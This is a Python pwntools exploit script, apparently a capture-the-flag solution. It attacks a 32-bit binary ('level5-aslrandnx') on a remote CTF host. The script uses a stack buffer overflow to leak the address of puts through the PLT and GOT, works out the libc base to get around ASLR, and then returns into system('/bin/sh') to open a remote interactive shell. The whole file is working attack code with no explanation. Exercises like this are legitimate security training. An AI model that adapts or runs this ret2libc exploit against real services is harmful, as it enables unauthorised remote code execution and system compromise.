#! /usr/bin/env python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2019 ctf <hzshang15@gmail.com>
#
# Distributed under terms of the MIT license.

from pwn import *
context.log_level="debug"

r=remote("pwn.sixstars.team",22005)
#r=process("./level5-aslrandnx")

elf=ELF("./level5-aslrandnx")
libc=ELF("./x32_libc-2.23.so")

put=elf.plt["puts"]
puts=elf.got["puts"]
sh1='a'*0x28+'a'*0x4+p32(put)+p32(0x080484E7)+p32(puts)

r.recv()
r.sendline(sh1)
a=r.recv(4)
real_puts=libc.sym["puts"]
print hex(real_puts)
a=u32(a)
print hex(a)
libc.address=a-real_puts
print hex(libc.address)

r.recv()
sh_addr=list(libc.search("/bin/sh"))[0]
exe_addr=libc.sym["system"]
sh2='a'*0x28+'a'*0x4+p32(exe_addr)+p32(0)+p32(sh_addr)
r.sendline(sh2)

r.interactive()
